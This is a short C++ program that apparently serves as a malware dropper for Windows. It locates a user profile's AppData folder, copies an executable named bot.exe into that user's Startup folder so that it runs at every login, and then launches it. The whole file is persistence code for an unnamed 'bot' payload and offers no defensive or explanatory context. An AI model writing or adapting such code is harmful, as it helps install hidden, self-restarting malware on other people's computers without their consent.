#include <iostream>
#include <w32api.h>
#include <string>
#include <filesystem>
using namespace std;
string GetPath(){
    for(const filesystem::path & path : filesystem::directory_iterator("C:\\Users") ){
        if(filesystem::exists(filesystem::path(path.u8string() + "\\AppData")) & path.u8string() != "C:\\Users\\Default"){
            return path.u8string() + "\\AppData";
        }else{
            continue;
        }
    }
    return "";
}
void SideLoad(string path){

    filesystem::copy_file(filesystem::path(filesystem::current_path().u8string() + "\\bot.exe"),path+ "\\bot.exe");
}
int main(){
    string path = "";
    path = GetPath();
    string PATH = path + "\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    cout << path;
    SideLoad(PATH);
    system("start bot.exe");
}